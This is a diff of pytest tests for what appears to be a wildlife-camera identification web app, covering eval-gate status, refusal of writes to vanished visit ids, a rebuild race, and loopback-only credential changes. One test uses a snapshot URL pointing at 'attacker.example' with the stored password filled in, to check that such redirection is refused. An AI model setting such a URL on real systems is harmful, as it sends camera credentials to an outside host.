@@ -925,6 +925,22 @@ def test_evalstatus_reads_the_gate_floor_breach_and_stale(tmp_path, monkeypatch)
     assert s["stale"] is False and s["floor_breaches"] == [] and s["baseline_artifact"] is None
 
 
+def test_evalstatus_reports_a_wrong_naming_point_and_how_long_naming_has_paused(tmp_path,
+                                                                                monkeypatch):
+    """The configured auto-assign point making wrong names fails the gate on its own, and the chip
+    says how many nights auto-assign has not run."""
+    point = {"metric": "configured auto-assign point", "threshold": 0.88, "margin": 0.02,
+             "assigned": 20, "errors": 2, "breached": True, "note": None}
+    s = _evalstatus_for(tmp_path, monkeypatch, "eval_20261016T003000Z.json", {
+        "meta": {"run_at": "2026-10-15T17:30:00-07:00"},
+        "baseline_diff": {"ok": True, "regressions": []},
+        "gate": {"floors": {"ok": True, "rows": [], "breaches": []}, "operating_point": point,
+                 "staleness": {"stale": False, "unchanged_nights": 0},
+                 "regression_streak": 4, "exit_code": 1}})
+    assert s["ok"] is False and s["skipped_nights"] == 4
+    assert s["regressions"] == ["configured auto-assign point: 2 wrong"]
+
+
 # ---- the roster: marking an individual as no longer resident -------------------------
 # Templates outlive the animal. Notch's last labelled crop is 2026-06-30 and Matt confirms it
 # stopped coming, but at the recommended operating point the auto tier still lined up to write
@@ -1254,6 +1270,57 @@ def test_every_dashboard_confirm_sends_the_queue_species():
     assert calls and all("body:reidBody(" in c[:200] for c in calls)
 
 
+def test_every_dashboard_confirm_reads_the_servers_answer():
+    """A refused confirm (a 409) must never look like a saved one -- bulk loops included."""
+    src = (Path(__file__).resolve().parent.parent / "dashboard.js").read_text(encoding="utf-8")
+    calls = src.split("'/api/reid/confirm'")[1:]
+    assert calls and all(".then(r=>r.json())" in c[:200] for c in calls)
+
+
+# ---- a visit id the ledger no longer holds ----------------------------------------------
+# Ids are stable across rebuilds, but a visit that merges with a neighbour or loses its first
+# crop takes its id with it. A write aimed at such an id is refused, never an ok that saved nothing.
+
+def test_confirming_a_vanished_visit_is_refused_and_writes_nothing(corpus, conn, api_port):
+    before = conn.execute("SELECT COUNT(*) FROM detections WHERE individual_id = 'Stan'"
+                          ).fetchone()[0]
+    status, out = _post(api_port, "/api/reid/confirm", {"visit_id": 10_000_000, "name": "Stan"})
+    assert status == 409 and out["stale_visit"] is True and "Reload" in out["error"]
+    assert conn.execute("SELECT COUNT(*) FROM detections WHERE individual_id = 'Stan'"
+                        ).fetchone()[0] == before
+
+
+def test_labelling_a_vanished_visit_by_id_is_refused(corpus, api_port):
+    status, out = _post(api_port, "/api/visit/label", {"visit_id": 10_000_000, "name": "Stan"})
+    assert status == 409 and out["stale_visit"] is True
+
+
+def test_the_queue_pairs_its_matcher_and_its_pool_from_one_ledger(corpus, db_path, monkeypatch):
+    """The live bug: the matcher's ids and the visit pool came from different queries, a rebuild
+    landed between them, and every card read 'no embedded crops yet' with a funnel of zeros."""
+    real = individuals.VisitMatcher
+
+    class RebuildRightAfterLoading(real):
+        def __init__(self, *a, **k):
+            super().__init__(*a, **k)
+            w = db.connect(db_path)           # every id changes: the worst a rebuild can do
+            try:
+                w.execute("UPDATE visits SET id = id + 1000")
+                w.execute("UPDATE detections SET visit_id = visit_id + 1000 "
+                          "WHERE visit_id IS NOT NULL")
+                w.commit()
+            finally:
+                w.close()
+    monkeypatch.setattr(individuals, "VisitMatcher", RebuildRightAfterLoading)
+
+    out = _queue(_rq_cfg(db_path), since_h=0)
+    by_source = {s["source"]: s for s in out["funnel"]["by_source"]}
+    assert by_source[db.SOURCE_GLASS_DOOR_CAM]["confirmed"] == 2
+    assert by_source[db.SOURCE_GLASS_DOOR_CAM]["templated"] is True
+    card = next(v for v in out["queue"] if v["visit_id"] == corpus["stale_probe"])
+    assert card["n_embedded"] == 3 and card["candidates"][0]["name"] == "Stan"
+
+
 def test_an_unsigned_verdict_is_recorded_as_nobody_not_as_a_guess(corpus, db_path):
     """No logged_by -> labeled_by stays NULL, which reads as 'the operator, before attribution'.
     It must never be filled with a placeholder."""
@@ -1288,8 +1355,8 @@ def test_an_unsigned_verdict_is_recorded_as_nobody_not_as_a_guess(corpus, db_pat
 # CROSS-CAMERA pairing: a trail-cam visit cannot be appearance-matched at all, so a human noticing
 # that the other camera saw the same animal in the same minutes is the only evidence that can ever
 # name one. These tests pin that pairing, and pin the two ways it must NOT mislead -- a camera far
-# away in time is not a neighbour, and a visit id that no longer exists is a normal answer (visits
-# .py renumbers from scratch on every rebuild) rather than a crash.
+# away in time is not a neighbour, and a visit id that no longer exists is a normal answer (a
+# visit that merges in a rebuild takes its id with it) rather than a crash.
 # =====================================================================================
 def test_dossier_returns_the_visit_with_its_evidence_and_the_answer_options(corpus, db_path):
     cfg = _rq_cfg(db_path)
@@ -1304,8 +1371,8 @@ def test_dossier_returns_the_visit_with_its_evidence_and_the_answer_options(corp
     assert out["candidates"] and out["candidates"][0]["name"] == "Stan"
 
 
-def test_dossier_of_a_renumbered_away_visit_is_empty_not_an_error(corpus, db_path):
-    """visits.py rebuilds from scratch and renumbers; labels survive on the detections, ids do not.
+def test_dossier_of_a_vanished_visit_is_empty_not_an_error(corpus, db_path):
+    """A visit that merges in a rebuild takes its id with it; labels survive on the detections.
     The flow steps through ids captured earlier, so a vanished one must be an ordinary answer."""
     cfg = _rq_cfg(db_path)
     assert web._reid_dossier(cfg, 10_000_000) == {}
@@ -1528,6 +1595,25 @@ def test_moving_a_camera_with_a_stored_password_needs_loopback(db_path, monkeypa
         _, listed = _get(port, "/api/cameras")
         assert [r for r in listed["rows"] if r["source"] == "yard_ir"][0]["url_host"] \
             == "192.168.1.105"
+    finally:
+        web.shutdown(server)
+
+
+def test_pointing_the_snapshot_url_elsewhere_needs_loopback_too(db_path, monkeypatch):
+    """The snapshot URL is a second place the stored password gets sent ({password} is filled
+    in at startup), so changing it is the same credential operation as moving the camera."""
+    cfg = _cam_cfg(db_path)
+    server = _cam_server(cfg)
+    port = server.server_address[1]
+    try:
+        _, saved = _post(port, "/api/cameras/save", dict(NET_CAM, password="hunter2"))
+        monkeypatch.setattr(web, "_is_loopback_client", lambda peer: False)
+        status, body = _post(port, "/api/cameras/save",
+                             dict(NET_CAM, id=saved["camera"]["id"],
+                                  snapshot_url="http://attacker.example/x?p={password}"))
+        assert status == 403 and "sent to wherever it points" in body["error"]
+        _, listed = _get(port, "/api/cameras")
+        assert listed["rows"][0]["snapshot_url"] is None
     finally:
         web.shutdown(server)
 
